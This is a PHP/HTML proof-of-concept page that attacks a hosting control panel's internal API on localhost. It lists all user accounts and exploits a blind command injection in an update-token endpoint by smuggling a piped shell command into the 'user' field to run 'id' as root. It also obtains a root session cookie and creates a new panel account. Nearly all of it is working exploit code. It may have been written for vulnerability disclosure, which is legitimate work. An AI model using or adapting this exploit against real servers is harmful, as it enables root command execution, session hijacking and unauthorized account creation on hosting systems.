<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootswatch@4.5.2/dist/slate/bootstrap.min.css" integrity="sha384-8iuq0iaMHpnH2vSyvZMSIqQuUnQA7QM+f6srIdlgBrTSEyd//AWNMyEaSF2yPzNQ" crossorigin="anonymous">
</head>
<body> 
  
  <div class="container">
    <h2>
      Users Panel accessing Internal API
    </h2>
  


<?php

/*

This is a really simple demo page to interact with the internal API

*/

## - https://stackoverflow.com/questions/5647461/how-do-i-send-a-post-request-with-php
## - Simple function to post and return JSON
function httpPost($url, $data)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_POST, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    $json_response = json_decode($response, true);
    return $json_response;
}

# List all User Accounts
$fields = ['action' => 'list', ];

$accounts = httpPost('https://127.0.0.1:2302/v1/account/', $fields);

?>
	<h2 class="mt-3">
      All Panel User Accounts
  </h2>
  <table class="table">
  <thead>
    <tr>
      <th scope="col">Username</th>
      <th scope="col">Email</th>
      <th scope="col">SetupDate</th>
      <th scope="col">Domain</th>
    </tr>
  </thead>
  <tbody>
    
    <?php
foreach ($accounts['msj'] as $account)
{

    echo '<tr><td>' . $account['username'] . '</td><td>' . $account['email'] . '</td><td>' . $account['setup_date'] . '</td><td>' . $account['domain'] . '</td></tr>';

}
?>
    
  </tbody>
</table>
  
    <h2 class="mt-3">
      Running command <code>id</code> as root
    </h2>
    
    <?php
// This is a blind command injection so for Poc we just write and read a file to get our output
$fields = ['user' => '|echo `id` > /tmp/panel_exec.txt|', ];

$run_command = httpPost('https://127.0.0.1:2302/v1/updatetoken/', $fields);
$output = shell_exec('cat /tmp/panel_exec.txt');

echo '<textarea class="form-control">' . $output . '</textarea>';

?>
    
    
    
    <h2 class="mt-3">
      Generate a root session and get the cookies
    </h2>
    
    <?php
// Easier just to use Curl Cookie output
$output = shell_exec("curl -c - -k -X POST -d 'ip=86.160.74.94' https://127.0.0.1:2302/v1/sessionroot/");

echo '<textarea class="form-control" rows=6>' . $output . '</textarea>';

?>
    
    
    <h2 class="mt-3">
      Create a new account
    </h2>
    
    <?php
// This is a blind command injection so for Poc we just write and read a file to get our output
$fields = ['action' => 'add', 'user' => 'randus', 'domain' => 'randomdomain.example.com', 'pass' => 'SuperSecretPass', 'email' => 'random@random.com', 'package' => 1, 'inode' => 0, 'limit_nproc' => 40, 'limit_nofile' => 150, 'server_ips' => '34.254.187.152'];

$output = httpPost('https://127.0.0.1:2302/v1/account/', $fields);

echo '<textarea class="form-control">' . json_encode($output) . '</textarea>';

?>
    
    
  </div>
  
  
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
</body>
</html>
